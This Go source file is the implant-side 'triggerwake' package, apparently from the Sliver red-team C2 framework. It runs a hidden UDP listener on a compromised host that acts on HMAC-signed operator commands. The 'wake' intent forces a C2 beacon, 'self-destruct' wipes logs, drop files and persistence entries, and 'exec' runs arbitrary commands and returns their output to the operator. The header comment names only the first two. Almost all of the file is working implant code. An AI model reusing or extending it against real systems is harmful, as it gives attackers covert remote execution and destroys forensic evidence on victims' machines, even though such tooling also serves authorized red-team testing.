package triggerwake

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	------------------------------------------------------------------------

	Package triggerwake is the IMPLANT-side passive UDP listener for
	signed wake / self-destruct triggers. Unlike the server-side
	listener (which dispatches into operator-configurable handlers),
	this implant-side variant has a FIXED, hardcoded task set:

	  "wake"          -> transports.WakeNow()  (short-circuits beacon sleep)
	  "self-destruct" -> burn.Now()            (initiates self-destruct)

	The task set is fixed by design: the implant runs in hostile
	environments and shouldn't be configurable post-build. Whatever
	tasks the operator wants this implant to respect get baked in
	at build time. Adding new task kinds = adding a case to the
	switch in handleAcceptedTrigger below.

	Template-directive gated (Sliver convention). The package is only
	imported when the IncludeTriggerWake field on ImplantConfig is
	true; the transport's bind address and HMAC secret come from
	the TriggerWakeBindAddr and TriggerWakeSecret fields via template
	render at build time. NO build tags. NO -X ldflags injection.

	Footprint note: this package imports github.com/0x90pkt/trigger/
	pkg/protocol, which transitively imports encoding/json. That adds
	~150-300 KB to the implant binary. Task #23 tracks replacing
	the JSON path with a hand-rolled minimal tokenizer for the implant
	build only — deferred to a follow-up commit.
*/

import (
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/0x90pkt/trigger/pkg/protocol"

	"github.com/bishopfox/sliver/implant/sliver/burn"
	"github.com/bishopfox/sliver/implant/sliver/transports"
)

// Config is the implant-side triggerwake configuration. Populated at
// build time via template directives in main.go / runner.go that
// reference .Config.TriggerWakeBindAddr / .Config.TriggerWakeSecret.
type Config struct {
	// BindAddr is the host:port UDP listen address.
	BindAddr string
	// Secret is the HMAC-SHA256 key for verifying incoming triggers.
	Secret []byte
	// AllowedClientIDs, if non-empty, restricts which client_id values
	// the implant accepts. Empty = any signed client.
	AllowedClientIDs []string
	// MaxClockSkew bounds timestamp vs wall-clock drift. Default 45s.
	MaxClockSkew time.Duration
	// ReplayWindow is the replay-cache TTL. Default 5 min.
	ReplayWindow time.Duration

	// BurnExtraPaths is the list of filesystem paths the implant will
	// wipe on a self-destruct trigger. Typically: known logs, drop
	// files, scratch dirs, the implant's own audit cache. Hardcoded
	// at build time so the operator's bind doesn't influence what
	// gets wiped at runtime.
	BurnExtraPaths []string

	// BurnPersistence is the list of platform-specific persistence
	// artifacts (systemd unit paths, registry keys, launchd plists)
	// the implant will scrub on self-destruct.
	BurnPersistence []string

	// ClientID is the identifier sent in exec response frames. Set at
	// build time to distinguish implant instances. Defaults to "implant".
	ClientID string
}

// Start spawns the listener and returns a stop function. Idempotent
// in the sense that calling stop multiple times is safe; calling
// Start twice produces two independent listeners (caller's problem).
//
// The implant's main loop calls this once during startup when the
// IncludeTriggerWake field on ImplantConfig is true.
//
// Errors during bind are returned synchronously. Errors during the
// receive loop are logged (under the Debug template gate) and the loop
// continues — a transient I/O error must not knock the implant's
// wake/burn channel offline.
func Start(parent context.Context, cfg Config) (stop func(), err error) {
	if cfg.BindAddr == "" {
		return nil, errBindAddrEmpty
	}
	if len(cfg.Secret) == 0 {
		return nil, errSecretEmpty
	}
	if cfg.MaxClockSkew <= 0 {
		cfg.MaxClockSkew = 45 * time.Second
	}
	if cfg.ReplayWindow <= 0 {
		cfg.ReplayWindow = 5 * time.Minute
	}
	if cfg.ClientID == "" {
		cfg.ClientID = "implant"
	}

	addr, err := net.ResolveUDPAddr("udp", cfg.BindAddr)
	if err != nil {
		return nil, err
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithCancel(parent)
	replay := newReplayCache(cfg.ReplayWindow)

	go func() {
		<-ctx.Done()
		_ = conn.Close()
	}()

	go func() {
		buf := make([]byte, 8192)
		for {
			_ = conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
			n, remote, err := conn.ReadFromUDP(buf)
			if err != nil {
				select {
				case <-ctx.Done():
					return
				default:
					if isTimeout(err) {
						continue
					}
					// {{if .Config.Debug}}
					log.Printf("[triggerwake] read error: %v", err)
					// {{end}}
					continue
				}
			}
			payload := make([]byte, n)
			copy(payload, buf[:n])
			handlePacket(payload, remote, &cfg, replay, conn)
		}
	}()

	return cancel, nil
}

// handlePacket runs the per-packet validation pipeline. Modifies the
// replay cache. For bidirectional intents (exec), sends a signed
// response back to the remote via conn.
func handlePacket(payload []byte, remote *net.UDPAddr, cfg *Config, replay *replayCache, conn *net.UDPConn) {
	// Skip response frames -- we only process inbound trigger messages.
	if protocol.IsResponse(payload) {
		return
	}

	msg, err := protocol.DecodeWire(payload)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] decode failed from %v: %v", remote, err)
		// {{end}}
		return
	}

	if len(cfg.AllowedClientIDs) > 0 {
		var ok bool
		for _, allowed := range cfg.AllowedClientIDs {
			if allowed == msg.ClientID {
				ok = true
				break
			}
		}
		if !ok {
			// {{if .Config.Debug}}
			log.Printf("[triggerwake] client_id %q not allowed", msg.ClientID)
			// {{end}}
			return
		}
	}

	// Timestamp skew.
	msgTime, err := protocol.ParseTimestamp(msg.Timestamp)
	if err != nil {
		return
	}
	now := time.Now().UTC()
	skew := now.Sub(msgTime)
	if skew < 0 {
		skew = -skew
	}
	if skew > cfg.MaxClockSkew {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] clock skew too large: %v", skew)
		// {{end}}
		return
	}

	// HMAC verify (constant-time via hmac.Equal).
	ok, err := verifyHMAC(msg, cfg.Secret)
	if err != nil || !ok {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] HMAC verify failed for %v: %v", remote, err)
		// {{end}}
		return
	}

	// Replay.
	if !replay.markIfNew(msg.Nonce, now) {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] replay nonce %s", msg.Nonce)
		// {{end}}
		return
	}

	// Authenticated signal received — reset the TTL countdown so an
	// actively-used implant never self-destructs. burn.ResetTTL() is
	// a no-op when TTL is disabled (the channel exists but nobody reads it).
	burn.ResetTTL()

	// Dispatch to fixed task set.
	switch msg.Intent {
	case "wake":
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] wake triggered by %s (transport=%q)", msg.ClientID, msg.Payload)
		// {{end}}
		// Payload carries the operator's preferred C2 transport scheme
		// (e.g. "mtls", "wg", "http", "dns"). Empty = try all.
		transports.WakeNow(msg.Payload)
	case "self-destruct":
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] self-destruct triggered by %s", msg.ClientID)
		// {{end}}
		go burn.Now(burn.Options{
			Reason:      burn.ReasonOperatorTriggered,
			ExtraPaths:  cfg.BurnExtraPaths,
			Persistence: cfg.BurnPersistence,
		})
	case "exec":
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec triggered by %s: %q", msg.ClientID, msg.Payload)
		// {{end}}
		select {
		case execSem <- struct{}{}:
			go func() {
				defer func() { <-execSem }()
				handleExec(msg, remote, cfg, conn)
			}()
		default:
			// at max concurrent exec capacity, drop
		}
	default:
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] unknown task %q ignored", msg.Intent)
		// {{end}}
	}
}

// handleExec executes a command from the trigger payload and sends the
// output back to the operator as a signed UDP response. The command
// is split on whitespace (first token = binary, rest = args). Output
// is capped at maxExecOutputBytes to fit within a single UDP datagram.
//
// This is the implant side of the bidirectional trigger channel:
// operator sends intent=exec with payload="ls -la /tmp", implant
// runs it, sends stdout+stderr back to the operator's source address.
func handleExec(msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, conn *net.UDPConn) {
	cmdLine := strings.TrimSpace(msg.Payload)
	if cmdLine == "" {
		sendExecResponse(msg, remote, cfg, conn, 1, "", "empty payload")
		return
	}

	parts := strings.Fields(cmdLine)
	bin := parts[0]
	var args []string
	if len(parts) > 1 {
		args = parts[1:]
	}

	// {{if .Config.Debug}}
	log.Printf("[triggerwake] exec: bin=%s args=%v", bin, args)
	// {{end}}

	ctx, cancel := context.WithTimeout(context.Background(), execTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, bin, args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	exitCode := 0
	var execErr string
	if err != nil {
		execErr = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	// Combine stdout+stderr, cap at max size for UDP.
	output := stdout.String() + stderr.String()
	if len(output) > maxExecOutputBytes {
		output = output[:maxExecOutputBytes] + "\n... [truncated]"
	}

	sendExecResponse(msg, remote, cfg, conn, exitCode, output, execErr)
}

// sendExecResponse constructs and sends a signed TriggerResponse back
// to the operator. Best-effort: UDP send failures are logged but do
// not retry (fire-and-forget semantics match the trigger protocol).
func sendExecResponse(msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, conn *net.UDPConn, exitCode int, output string, execErr string) {
	nonce, err := protocol.GenerateNonce()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response nonce error: %v", err)
		// {{end}}
		return
	}

	resp := protocol.TriggerResponse{
		Version:      protocol.ProtocolVersion,
		Type:         protocol.ResponseType,
		RequestNonce: msg.Nonce,
		ClientID:     cfg.ClientID,
		Nonce:        nonce,
		Timestamp:    protocol.NowUTC(),
		ExitCode:     exitCode,
		Output:       output,
		Error:        execErr,
	}

	sig, err := protocol.SignResponse(resp, string(cfg.Secret))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response sign error: %v", err)
		// {{end}}
		return
	}
	resp.Signature = sig

	data, err := protocol.EncodeResponse(resp)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response encode error: %v", err)
		// {{end}}
		return
	}

	if _, err := conn.WriteToUDP(data, remote); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response send error: %v", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] exec response sent to %v (exit=%d, %d bytes)", remote, exitCode, len(data))
	// {{end}}
}

// execSem limits concurrent handleExec goroutines. Prevents an
// adversary (or a burst of legitimate exec triggers) from fork-bombing
// the implant host. Capped at 3 concurrent execs; excess packets are
// silently dropped.
var execSem = make(chan struct{}, 3)

const (
	// maxExecOutputBytes caps the response payload to stay within a
	// single UDP datagram. Conservative: 8192 - header overhead.
	maxExecOutputBytes = 7168
	// execTimeout is the maximum wall-clock time for a triggered exec.
	execTimeout = 30 * time.Second
)

// verifyHMAC re-computes the canonical-JSON HMAC over msg (sans
// signature) and constant-time compares to msg.Signature.
//
// We use the standalone protocol package's Sign() and hmac.Equal so
// the cryptographic behavior is byte-identical to the server-side
// listener — same canonical form, same HMAC scheme.
func verifyHMAC(msg protocol.TriggerMessage, secret []byte) (bool, error) {
	if msg.Signature == "" {
		return false, nil
	}
	// Pass through to the standalone protocol package's Sign so any
	// canonicalization change there propagates here automatically.
	expected, err := protocol.Sign(msg, string(secret))
	if err != nil {
		return false, err
	}
	return hmac.Equal([]byte(expected), []byte(msg.Signature)), nil
}

// replayCache is a tiny replay-nonce window. Sliver implants are
// memory-constrained; keep this small and bounded. maxEntries caps the
// number of tracked nonces to prevent memory exhaustion if an adversary
// floods the listener with unique nonces faster than TTL expiry purges
// them. When the cap is reached, new nonces are still accepted (we
// can't block legitimate triggers) but the oldest entry is evicted
// before insertion. Default cap: 512.
type replayCache struct {
	mu         sync.Mutex
	ttl        time.Duration
	maxEntries int
	seen       map[string]time.Time
}

const defaultMaxReplayEntries = 512

func newReplayCache(ttl time.Duration) *replayCache {
	return &replayCache{
		ttl:        ttl,
		maxEntries: defaultMaxReplayEntries,
		seen:       make(map[string]time.Time, 32),
	}
}

func (r *replayCache) markIfNew(nonce string, now time.Time) bool {
	r.mu.Lock()
	defer r.mu.Unlock()

	// Purge expired entries.
	for k, exp := range r.seen {
		if now.After(exp) {
			delete(r.seen, k)
		}
	}

	if _, exists := r.seen[nonce]; exists {
		return false
	}

	// Cap enforcement: if at capacity after expiry purge, evict the
	// oldest entry to make room. O(n) scan is acceptable for n<=512.
	if r.maxEntries > 0 && len(r.seen) >= r.maxEntries {
		var oldestKey string
		var oldestExp time.Time
		for k, exp := range r.seen {
			if oldestKey == "" || exp.Before(oldestExp) {
				oldestKey = k
				oldestExp = exp
			}
		}
		if oldestKey != "" {
			delete(r.seen, oldestKey)
		}
	}

	r.seen[nonce] = now.Add(r.ttl)
	return true
}

// isTimeout reports whether the error is a net.Error timeout. Used
// to ignore SetReadDeadline-driven timeouts in the receive loop.
func isTimeout(err error) bool {
	type timeoutErr interface{ Timeout() bool }
	if te, ok := err.(timeoutErr); ok {
		return te.Timeout()
	}
	return false
}

// Local errors kept package-private so the receive loop's logging
// can `errors.Is` them without exposing identity to dependent packages.
var (
	errBindAddrEmpty = simpleError("triggerwake: BindAddr is empty")
	errSecretEmpty   = simpleError("triggerwake: Secret is empty")
)

// Avoid importing the errors package for one-liners (footprint).
type simpleError string

func (e simpleError) Error() string { return string(e) }

// Forward references to keep imports clean.
var (
	_ = hex.EncodeToString
	_ = sha256.New
)
